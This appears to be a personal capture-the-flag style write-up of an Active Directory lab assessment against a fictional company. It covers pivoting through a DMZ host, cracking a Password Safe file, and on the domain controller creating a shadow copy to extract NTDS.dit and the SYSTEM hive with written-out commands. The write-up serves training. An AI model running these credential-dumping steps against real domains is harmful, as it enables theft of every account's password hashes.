## The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.

## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

|Host|IP Address|
|---|---|
|`DMZ01`|`10.129.*.*` **(External)**, `172.16.119.13` **(Internal)**|
|`JUMP01`|`172.16.119.7`|
|`FILE01`|`172.16.119.10`|
|`DC01`|`172.16.119.11`|

#### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

###### Exercise and only Question

Steps for getting the answer

Step 1. connect openvpn through the file downloaded from htb module.
![[Pasted image 20260803231736.png]]

Step2. We will find open ports via nmap command.
![[Pasted image 20260803231906.png]]

Step3. As we know that ssh port is open so now we will connect the target machine via ssh with given credentials by name (betty jade) and password (Texas123!@#) but first we have first find the username to login into ssh so we will use hydra for username verification. I have already created a detailed username list to get the login and saved the file by the name of users.txt.
![[Pasted image 20260803233002.png]]

Step4. We have now get the login credentials for the ssh. username-jbetty password-Texas123!@#
![[Pasted image 20260803233650.png]]

Step 5. Now we will log in via ssh and create a tunnel for internal lateral movement to get access to internal network.
![[Pasted image 20260808105718.png]]

Step6. Now before connecting to ssh we will setup few things for the internal lateral movement. First we will set up proxychain server to connect to internal network. we will add a line in the last of the file for setting the proxy.
![[Screenshot From 2026-08-08 11-10-05.png]]

Step7. Now we will use nmap from main attacking machine via proxychains to know the open ports of internal networks and we will only go for AD ports. (Jump Box)

![[Pasted image 20260810163341.png]]

Step8. Now we will connect to jumpbox via rdp but before that we have to find credentials to login via rdp the credentials we have used before to login ssh will not work so we have to find new credentials in the target machine. We will use history command and also filter the commands used to get the creds to login.
![[Pasted image 20260810165802.png]]

Step9.  Now we will login into rdp via xfreerdp command to Jump01 also known jump box. We will be using the credentials which we found and also connect our main pc folder via rdp as well as shown below. We will also take the password locked file found in \\file01\HR\Archive\Employee-Passwords_OLD.psafe3 to our main attacking pc.
![[Pasted image 20260810165938.png]]
![[Pasted image 20260810170310.png]]
![[Pasted image 20260810170104.png]]

Step10. After obtaining the file from the target machine via rdp we will now crack the password file via using john the ripper to get password safe creds to get more user. as shown below. first we will convert the file into hash txt file via pwsafe2john command.
![[Pasted image 20260810174359.png]]
b. Now we will edit the file to crack the hash.
![[Pasted image 20260810174521.png]]
c. Now we will crack the hash via john the ripper. And we have got the password.
![[Pasted image 20260810175643.png]]

Step11. Now we will login into Password safe application in windows rdp which we logged in earlier. We will able to see the domain users.
![[Pasted image 20260810180514.png]]

Step12. As we double click on any user a prompt comes up to copy the password. and click on OK.
![[Pasted image 20260810183737.png]]

Step13. Now we will rdp into stom Account by his password copied by password safe. we will use dc01 machine to log into stom account. we will also mount a folder from main pc via rdp as well.
![[Pasted image 20260810203714.png]]
![[Pasted image 20260810192924.png]]

Step14. Now we will open the cmd and confirm the local admins and `SeDebugPrivilege`/local admin on DC01.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\stom>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\stom>^V
'' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\stom>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON         Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                         Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Group used for deny only
Authentication authority asserted identity    Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level        Label            S-1-16-8192
```
```
```

Step15. Now we will shadow copy and extract **ntds.dit** and **SYSTEM** hive, but before that we will elevate from normal user to admin and verify it as well.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\stom>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\stom>^V
'' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\stom>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON         Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                         Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Group used for deny only
Authentication authority asserted identity    Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level        Label            S-1-16-8192

C:\Users\stom>powershell Start-Process cmd -Verb runAs

C:\Users\stom>
```
```
```
b. System escalated to admin and verified.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Step16. We will now proceed with the **ntds.dit** and **SYSTEM** hive.
```cmd
C:\Windows\system32>vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {4015b1bf-4fda-405e-ac3c-3c6769ff3727}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Step17. We will now create a NTDS folder for our extracted ntds and system hive. we will copy both files to the NTDS folder and verified it as well.
```cmd
C:\Windows\system32>mkdir C:\NTDS

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
        1 file(s) copied.

C:\Windows\system32>reg.exe save hklm\system C:\NTDS\SYSTEM
The operation completed successfully.

C:\Windows\system32>dir C:\NTDS
 Volume in drive C has no label.
 Volume Serial Number is C898-F1E2

 Directory of C:\NTDS

08/10/2026  09:25 AM    <DIR>          .
08/10/2026  09:25 AM    <DIR>          ..
08/10/2026  08:51 AM        16,777,216 NTDS.dit
08/10/2026  09:25 AM        16,228,352 SYSTEM
               2 File(s)     33,005,568 bytes
               2 Dir(s)   5,683,712,000 bytes free

C:\Windows\system32>
```

Step18. We will now pull the folder to our main pc by the folder we shared via rdp.